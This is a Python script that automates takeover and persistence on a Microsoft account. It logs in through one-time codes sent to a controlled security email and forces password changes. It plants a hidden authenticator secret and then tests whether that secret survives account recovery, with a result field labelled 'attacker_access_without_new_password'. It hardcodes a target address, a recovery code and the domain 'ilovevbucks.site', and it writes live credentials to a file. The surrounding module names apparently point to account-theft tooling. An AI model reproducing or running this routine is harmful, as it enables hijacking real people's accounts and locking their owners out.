#!/usr/bin/env python3
"""Experiment 2b: TOTP survival after RC-only RecoverUser.

Uses security-email OTP login (not RecoverUser password) to get a session,
ChangePassword to stick a known password, plant TOTP, RecoverUser again,
OTP login on new sec email, ChangePassword again, then test TOTP.
"""
from __future__ import annotations

import asyncio
import json
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.autobuy_hold_check import fetch_credential_type
from securing.recovery_secure import _flowtoken_from_auth
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_authenticator import login_authenticator
from securing.utils.proxy import close_session
from securing.utils.security.add_authenticator import add_authenticator
from securing.utils.security.change_password import change_password_authenticated
from securing.utils.security.password_gen import generate_ms_password
from securing.utils.security.recovery import recover, verify_password_works
from securing.utils.security_information import security_information

EMAIL = "mcfa.uhtn6av7@outlook.com"
DOMAIN = "ilovevbucks.site"
CREDS_FILE = Path(__file__).resolve().parents[1] / "forensics" / "mcfa_LIVE_CREDS_after_experiment.txt"
OUT = Path(__file__).resolve().parents[1] / "forensics" / "totp_survival_experiment.json"


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _load_creds() -> dict:
    d = {}
    if CREDS_FILE.exists():
        for line in CREDS_FILE.read_text().splitlines():
            if "=" in line:
                k, v = line.split("=", 1)
                d[k.strip()] = v.strip()
    return d


def _save_creds(**kwargs) -> None:
    cur = _load_creds()
    cur.update({k: str(v) for k, v in kwargs.items() if v is not None})
    cur["updated"] = _now()
    order = [
        "email", "password", "security_email", "recovery_code",
        "planted_totp", "password_verified", "phase",
    ]
    lines = [f"{k}={cur[k]}" for k in order if k in cur]
    lines.append(f"updated={cur['updated']}")
    CREDS_FILE.write_text("\n".join(lines) + "\n")


def _gct_snap(gct) -> dict:
    c = (gct or {}).get("Credentials") or {}
    return {
        "HasPhone": c.get("HasPhone"),
        "HasFido": c.get("HasFido"),
        "HasRemoteNGC": c.get("HasRemoteNGC"),
        "Otc": [
            {
                "display": p.get("display"),
                "type": p.get("type"),
                "isDefault": p.get("isDefault"),
            }
            for p in (c.get("OtcLoginEligibleProofs") or [])
            if isinstance(p, dict)
        ],
    }


async def otp_login_session(session, email: str, security_email: str) -> bool:
    """Establish MSAAUTH via security-email OTP — does NOT call secure()/wipe."""
    code = None
    flowtoken = None
    for round_i in range(1, 3):
        info = await send_auth(session, email, security_email)
        flowtoken, auth_error = _flowtoken_from_auth(info)
        if auth_error:
            raise RuntimeError(f"send_auth blocked: {auth_error}")

        # Explicit GOTC with ProofConfirmation — send_auth alone often leaves
        # otcSent=false / State 203 under risk. State 201 = code sent.
        live = await livedata(session)
        payload = {
            "login": email,
            "flowtoken": live["ppft"],
            "purpose": "eOTT_OtcLogin",
            "channel": "Email",
            "ChallengeViewSupported": 1,
            "AltEmailE": flowtoken,
            "lcid": 1033,
            "ProofConfirmation": security_email,
        }
        since = time.time()
        gotc = await session.post(
            "https://login.live.com/GetOneTimeCode.srf?id=38936",
            headers={
                "Accept": "application/json",
                "Content-type": "application/x-www-form-urlencoded",
            },
            data=payload,
        )
        print(f"[~] GOTC round {round_i}: {(gotc.text or '')[:180]}")
        print(f"[~] OTP round {round_i}/2 waiting for code at {security_email}…")
        code = await get_email_code(security_email, timeout=90, since=since)
        print(f"Got code - {code}")
        if code:
            break
    if not code:
        raise RuntimeError("No OTP arrived at security email")

    live = await livedata(session)
    msa = await get_msaauth(
        session, email, flowtoken, live, code, live.get("ppft")
    )
    if not msa or (isinstance(msa, dict) and msa.get("_error")):
        raise RuntimeError(f"get_msaauth failed: {msa}")
    if msa in ("Recovery", "Family"):
        raise RuntimeError(f"get_msaauth status={msa}")
    await polish_host(session, msa if isinstance(msa, dict) else {"_cookies_only": True})
    ok = has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth")
    print(f"[+] OTP session ok={ok}")
    return ok


async def main():
    report = {
        "experiment": "totp_survival_via_otp_login_and_changepassword",
        "started": _now(),
        "account": EMAIL,
        "phases": {},
        "access_tests": {},
    }
    creds = _load_creds()
    sec = creds.get("security_email") or "016c1497771d457a@ilovevbucks.site"
    rc = creds.get("recovery_code") or "KHET7-WJMJW-3KD2Q-CPWZ4-5BBFJ"
    print(f"Start sec={sec} rc={rc}")

    # --- Phase 1: OTP login → ChangePassword (stick pwd1) ---
    print("=== Phase 1: OTP login + ChangePassword ===")
    pwd1 = generate_ms_password(16)
    session = get_session()
    try:
        ok = await otp_login_session(session, EMAIL, sec)
        report["phases"]["1_otp_login"] = {"ok": ok}
        if not ok:
            report["error"] = "OTP login failed to establish session"
            OUT.write_text(json.dumps(report, indent=2, default=str))
            return

        changed = await change_password_authenticated(session, pwd1)
        report["phases"]["1_change_password"] = {"ok": changed, "password": pwd1}
        print("ChangePassword:", changed)
        if changed:
            await asyncio.sleep(8)
            st = await verify_password_works(session, EMAIL, pwd1, settle_delay=5.0)
            report["phases"]["1_verify"] = st
            print("Verify pwd1:", st)
        _save_creds(
            email=EMAIL,
            password=pwd1,
            security_email=sec,
            recovery_code=rc,
            password_verified=bool(changed),
            phase="otp_changepassword",
        )
    except Exception as exc:
        report["phases"]["1_error"] = repr(exc)
        print("Phase1 error:", exc)
        OUT.write_text(json.dumps(report, indent=2, default=str))
        await close_session(session)
        return

    # Elevate + plant on same session
    print("=== Phase 2: elevate + plant TOTP ===")
    plant = None
    try:
        try:
            si = await security_information(
                session,
                security_email=sec,
                account_email=EMAIL,
                password=pwd1,
            )
            report["phases"]["2_elevate"] = {
                "ok": isinstance(si, dict),
                "keys": list(si.keys()) if isinstance(si, dict) else str(si)[:200],
            }
        except Exception as exc:
            report["phases"]["2_elevate"] = {"ok": False, "error": repr(exc)}
            print("Elevate:", exc)

        plant = await add_authenticator(session)
        report["phases"]["2_plant"] = {"ok": True, "secret": plant}
        print(f"[+] PLANTED TOTP={plant}")
        _save_creds(planted_totp=plant, phase="totp_planted")
    except Exception as exc:
        report["phases"]["2_plant"] = {"ok": False, "error": repr(exc)}
        print("[X] Plant failed:", exc)
        OUT.write_text(json.dumps(report, indent=2, default=str))
        await close_session(session)
        return
    finally:
        await close_session(session)

    report["phases"]["2_gct"] = _gct_snap(await fetch_credential_type(EMAIL))
    print("GCT after plant:", report["phases"]["2_gct"])

    # Control: pwd1 + TOTP
    print("=== Phase 2b: control pwd1+TOTP ===")
    session = get_session()
    try:
        ctrl = await login_authenticator(
            session, EMAIL, {"password": pwd1, "auth_secret": plant}
        )
        report["access_tests"]["before_recover_pwd1_plus_totp"] = {
            "result": ctrl,
            "ok": ctrl is True,
        }
        print("Control:", ctrl)
        if ctrl is not True:
            print("[!] Control login failed — continuing to recover test anyway")
    finally:
        await close_session(session)

    # --- Phase 3: RC-only RecoverUser ---
    print("=== Phase 3: RC-only RecoverUser ===")
    pwd_recover = generate_ms_password(16)  # may not stick; we ChangePassword after
    sec2 = f"{uuid.uuid4().hex[:16]}@{DOMAIN}"
    with DBConnection() as db:
        db.add_security_email(sec2, pwd_recover)

    session = get_session()
    try:
        rc2 = await recover(session, EMAIL, rc, sec2, pwd_recover)
        ok = bool(rc2) and rc2 != "invalid"
        report["phases"]["3_recover"] = {
            "ok": ok,
            "new_recovery_code": rc2,
            "new_security_email": sec2,
            "recover_password_field": pwd_recover,
            "skipped_remove_proof": True,
        }
        if not ok:
            report["error"] = "RecoverUser failed"
            OUT.write_text(json.dumps(report, indent=2, default=str))
            return
        print(f"[+] Recover OK rc={rc2} sec={sec2}")
        rc = rc2
        _save_creds(
            security_email=sec2,
            recovery_code=rc2,
            password=pwd_recover,
            planted_totp=plant,
            phase="post_recover",
        )
    finally:
        await close_session(session)

    await asyncio.sleep(5)
    report["phases"]["3_gct"] = _gct_snap(await fetch_credential_type(EMAIL))
    print("GCT after recover:", report["phases"]["3_gct"])

    # --- Phase 4: OTP login on NEW sec → ChangePassword pwd2 ---
    print("=== Phase 4: OTP login (new sec) + ChangePassword pwd2 ===")
    pwd2 = generate_ms_password(16)
    session = get_session()
    try:
        ok = await otp_login_session(session, EMAIL, sec2)
        report["phases"]["4_otp_login"] = {"ok": ok}
        print("OTP2:", report["phases"]["4_otp_login"])

        changed = await change_password_authenticated(session, pwd2)
        report["phases"]["4_change_password"] = {"ok": changed, "password": pwd2}
        print("ChangePassword2:", changed)
        if changed:
            await asyncio.sleep(8)
            st = await verify_password_works(session, EMAIL, pwd2, settle_delay=5.0)
            report["phases"]["4_verify"] = st
            print("Verify pwd2:", st)
        _save_creds(
            password=pwd2,
            security_email=sec2,
            recovery_code=rc,
            planted_totp=plant,
            password_verified=bool(changed),
            phase="post_recover_changepassword",
        )
    except Exception as exc:
        report["phases"]["4_error"] = repr(exc)
        print("Phase4 error:", exc)
        OUT.write_text(json.dumps(report, indent=2, default=str))
        await close_session(session)
        return
    finally:
        await close_session(session)

    # --- Phase 5: TOTP tests ---
    print("=== Phase 5: TOTP survival tests ===")
    session = get_session()
    try:
        r = await login_authenticator(
            session, EMAIL, {"password": pwd2, "auth_secret": plant}
        )
        report["access_tests"]["newest_pwd_plus_plant_totp"] = {
            "result": r,
            "ok": r is True,
            "means": "TOTP survived RC-only RecoverUser if True",
        }
        print("5a newest pwd + TOTP:", r)
    except Exception as exc:
        report["access_tests"]["newest_pwd_plus_plant_totp"] = {"error": repr(exc)}
    finally:
        await close_session(session)

    session = get_session()
    try:
        r = await login_authenticator(
            session, EMAIL, {"password": pwd1, "auth_secret": plant}
        )
        report["access_tests"]["old_pwd_plus_plant_totp"] = {
            "result": r,
            "ok": r is True,
            "means": "Access without newest password if True",
        }
        print("5b old pwd + TOTP:", r)
    except Exception as exc:
        report["access_tests"]["old_pwd_plus_plant_totp"] = {"error": repr(exc)}
    finally:
        await close_session(session)

    # Does password-only login still work / skip TOTP?
    from securing.auth.handle_redirects import get_data, handle_redirects
    from securing.utils.login_pwd import login_pwd

    session = get_session()
    try:
        live = await livedata(session)
        page = await login_pwd(session, EMAIL, live["urlPost"], pwd2, live["ppft"])
        needs_totp = bool(
            page
            and (
                "totp" in page.lower()
                or "authenticator" in page.lower()
            )
            and "arrUserProofs" in (page or "")
        )
        msa = get_data(page)
        handled = await handle_redirects(session, page)
        if isinstance(handled, dict):
            msa = handled
        elif isinstance(handled, str):
            msa = get_data(handled) or msa
        if msa:
            await polish_host(session, msa)
        has_sess = has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth")
        report["access_tests"]["newest_pwd_alone"] = {
            "session_without_totp": has_sess,
            "page_suggested_totp": needs_totp,
            "page_snip": (page or "")[:300],
        }
        print("5c pwd alone session=", has_sess, "suggested_totp=", needs_totp)
    except Exception as exc:
        report["access_tests"]["newest_pwd_alone"] = {"error": repr(exc)}
    finally:
        await close_session(session)

    report["phases"]["5_gct"] = _gct_snap(await fetch_credential_type(EMAIL))
    totp_ok = (report["access_tests"].get("newest_pwd_plus_plant_totp") or {}).get("ok")
    old_ok = (report["access_tests"].get("old_pwd_plus_plant_totp") or {}).get("ok")
    g5 = report["phases"].get("5_gct") or {}
    report["verdict"] = {
        "totp_survives_RC_only_RecoverUser": totp_ok,
        "attacker_access_without_new_password": old_ok,
        "HasRemoteNGC_after_plant": (report["phases"].get("2_gct") or {}).get("HasRemoteNGC"),
        "HasRemoteNGC_after_recover": (report["phases"].get("3_gct") or {}).get("HasRemoteNGC"),
        "HasRemoteNGC_final": g5.get("HasRemoteNGC"),
        "HasPhone_final": g5.get("HasPhone"),
        "implication": (
            "If totp_survives=True → remove_proof is mandatory after RecoverUser. "
            "If False → RecoverUser alone clears authenticator plants."
        ),
    }
    report["finished"] = _now()
    OUT.write_text(json.dumps(report, indent=2, default=str))
    print("\n=== VERDICT ===")
    print(json.dumps(report["verdict"], indent=2))
    print(CREDS_FILE.read_text())


if __name__ == "__main__":
    asyncio.run(main())
